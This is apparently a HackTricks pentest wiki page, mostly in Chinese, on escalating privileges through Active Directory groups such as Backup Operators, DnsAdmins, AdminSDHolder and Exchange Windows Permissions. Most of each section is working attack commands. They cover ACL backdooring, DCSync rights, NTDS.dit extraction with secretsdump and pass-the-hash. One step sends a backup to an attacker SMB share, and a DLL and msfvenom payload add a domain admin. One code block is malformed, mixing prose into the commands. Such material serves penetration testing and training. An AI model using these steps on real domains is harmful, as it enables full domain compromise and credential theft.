# 特权组

{{#include ../../banners/hacktricks-training.md}}

## 常见具有管理权限的组

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

该组有权创建域中非管理员的帐户和组。此外，它允许在域控制器（DC）上进行本地登录。

要识别该组的成员，执行以下命令：
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
允许添加新用户，并且允许本地登录到 DC。

## AdminSDHolder 组

**AdminSDHolder** 组的访问控制列表 (ACL) 非常关键，因为它为 Active Directory 中所有“受保护组”（包括高权限组）设置权限。该机制通过防止未授权修改来保障这些组的安全。

攻击者可以通过修改 **AdminSDHolder** 组的 ACL，授予普通用户完全权限来利用这一点。这会使该用户对所有受保护组拥有完全控制权。如果该用户的权限被更改或移除，系统的设计会在一小时内自动恢复这些权限。

最新的 Windows Server 文档仍将若干内置操作员组视为 **受保护** 对象（`Account Operators`、`Backup Operators`、`Print Operators`、`Server Operators`、`Domain Admins`、`Enterprise Admins`、`Key Admins`、`Enterprise Key Admins` 等）。**SDProp** 进程默认每 60 分钟在 **PDC Emulator** 上运行一次，会标记 `adminCount=1` 并在受保护对象上禁用继承。这既有利于持久性，也有助于发现那些已从受保护组中移除但仍保留非继承 ACL 的陈旧特权用户。

用于查看成员并修改权限的命令包括：
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
有一个脚本可用于加速恢复过程： [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

更多详情请访问 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)。

## AD 回收站

该组的成员可以读取已删除的 Active Directory 对象，这可能会泄露敏感信息：
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
这对于 **恢复先前的权限路径** 很有用。已删除的对象仍可能暴露 `lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、旧的 SPNs，或被删除的特权组的 DN，而这些可以在之后被另一个操作员恢复。
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### 域控制器访问

对 DC（域控制器）上的文件的访问受限，除非用户属于 `Server Operators` 组，这会改变访问级别。

### 权限提升

使用来自 Sysinternals 的 `PsService` 或 `sc`，可以检查并修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，允许执行任意命令并进行权限提升：
```cmd
C:\> .\PsService.exe security AppReadiness
```
该命令显示 `Server Operators` 拥有完全访问权限，使得操纵服务以提升权限成为可能。

## Backup Operators

属于 `Backup Operators` 组的成员可以访问 `DC01` 文件系统，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限允许进行文件夹遍历、列出和复制文件，即使没有显式权限，也可以通过使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志实现。此过程需要使用特定脚本。

要列出组成员，请执行：
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

为了在本地利用这些权限，执行以下步骤：

1. 导入必要的库：
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. 启用并验证 `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 从受限目录访问并复制文件，例如：
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD 攻击

直接访问域控制器的文件系统可以窃取 `NTDS.dit` 数据库，该数据库包含域用户和计算机的所有 NTLM 哈希。

#### 使用 diskshadow.exe

1. 创建 `C` 驱动器的卷影副本：
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 从快照复制 `NTDS.dit`:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
或者，使用 `robocopy` 进行文件复制：
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 提取 `SYSTEM` 和 `SAM` 以检索哈希：
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. 从 `NTDS.dit` 检索所有哈希：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 提取后：Pass-the-Hash 到 DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### 使用 wbadmin.exe

1. 在攻击者机器上为 SMB 服务器设置 NTFS 文件系统，并在目标机器上缓存 SMB 凭据。
2. 使用 `wbadmin.exe` 进行系统备份并提取 `NTDS.dit`：
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

属于 **DnsAdmins** 组的成员可以利用其权限在 DNS 服务器（通常托管在域控制器上）以 SYSTEM 权限加载任意 DLL。该能力具有很大的利用潜力。

要列出 DnsAdmins 组的成员，使用：
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> 该漏洞允许在 DNS 服务中以 SYSTEM 权限执行任意代码（通常发生在 DCs 内部）。该问题已于 2021 年修复。

成员可以使用如下命令使 DNS 服务器加载任意 DLL（本地或来自远程共享）：
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
重启 DNS 服务（可能需要额外权限）是加载该 DLL 所必需的：
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
有关此攻击向量的更多详细信息，请参阅 ired.team。

#### Mimilib.dll

也可以使用 mimilib.dll 来执行命令，通过修改它以运行特定命令或 reverse shells。[Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) 获取更多信息。

### WPAD Record for MitM

DnsAdmins 可以操纵 DNS 记录以通过创建 WPAD 记录并在禁用全局查询阻止列表后执行 Man-in-the-Middle (MitM) 攻击。可以使用 Responder 或 Inveigh 等工具进行欺骗并捕获网络流量。

### Event Log Readers
Members 可以访问事件日志，可能会发现敏感信息，例如明文密码或命令执行的详细信息：
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

该组可以修改域对象上的 DACLs，可能授予 DCSync 权限。利用该组进行 privilege escalation 的技术在 Exchange-AD-Privesc GitHub repo 中有详细说明。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
如果你能以该组成员的身份行事，经典的滥用方式是授予 attacker-controlled principal 实现 [DCSync](dcsync.md) 所需的复制权限：
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange** 将 mailbox access、coerced Exchange authentication 和 LDAP relay 串联起来以达到相同的原语。即使该 relay 路径被缓解，直接成为 `Exchange Windows Permissions` 的成员或控制 Exchange 服务器仍然是一条获得域复制权限的高价值路径。

## Hyper-V 管理员

Hyper-V 管理员对 Hyper-V 拥有完全访问权限，这可以被利用来控制虚拟化的域控制器。包括克隆运行中的 DC 并从 NTDS.dit 文件中提取 NTLM 哈希。

### 利用示例

实际滥用通常是 **离线访问 DC 磁盘/检查点**，而不是旧的主机级 LPE 把戏。获得 Hyper-V 主机访问后，操作者可以为虚拟化的域控制器创建检查点或导出，挂载 VHDX，并提取 `NTDS.dit`、`SYSTEM` 和其他秘密，而无需在来宾内触碰 LSASS：
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
从那里，重用 `Backup Operators` 工作流程，将 `Windows\NTDS\ntds.dit` 和注册表 hives 离线复制出来。

## 组策略创建者所有者

该组允许其成员在域内创建组策略（Group Policies）。然而，其成员不能将组策略应用到用户或组，也不能编辑现有的 GPOs。

重要的细微差别是，**creator becomes owner of the new GPO**，通常随后会获得足够的权限来编辑它。这意味着当你能够做到下面任一项时，该组就很有价值：

- 创建一个恶意 GPO 并说服管理员将其链接到目标 OU/域
- 编辑你创建的、已经链接到某处有用位置的 GPO
- 滥用另一个被委派的权限来链接 GPOs，而该组则提供编辑方面的权限

实际滥用通常意味着通过 SYSVOL-backed 的策略文件添加 **Immediate Task**、**startup script**、**local admin membership** 或 **user rights assignment** 的更改。
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.

To list the members of this group, the following PowerShell command is used:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
在域控制器上，这个组很危险，因为默认的域控制器策略将 **`SeLoadDriverPrivilege`** 授予 `Print Operators`。如果你为该组的成员获得了提升的 token，你可以启用该权限并加载一个已签名但存在漏洞的驱动，从而跳转到内核/SYSTEM。有关 token 处理的详细信息，请查看 [Access Tokens](../windows-local-privilege-escalation/access-tokens.md)。

#### Remote Desktop Users

该组的成员被授予通过 Remote Desktop Protocol (RDP) 访问 PC 的权限。要枚举这些成员，可以使用 PowerShell 命令：
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
有关利用 RDP 的更多见解可以在专门的 pentesting 资源中找到。

#### 远程管理用户

成员可以通过 **Windows Remote Management (WinRM)** 访问 PCs。枚举这些成员可以通过以下方式实现：
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
有关针对 **WinRM** 的利用技术，应查阅专门文档。

#### 服务器操作员

该组有权限对域控制器执行各种配置操作，包括备份和恢复权限、更改系统时间以及关闭系统。要枚举成员，使用的命令是：
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
在域控制器上，`Server Operators` 通常继承足够的权限以 **重新配置或启动/停止服务**，并且通过默认 DC 策略获得 `SeBackupPrivilege`/`SeRestorePrivilege`。实际上，这使得它们成为 **service-control abuse** 和 **NTDS extraction** 之间的桥梁：
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
如果服务的 ACL 赋予该组更改/启动权限，将服务指向任意命令，以 `LocalSystem` 身份启动，然后恢复原始的 `binPath`。如果服务控制被锁定，则退回到上文的 `Backup Operators` 技术以复制 `NTDS.dit`。

## 参考资料 <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
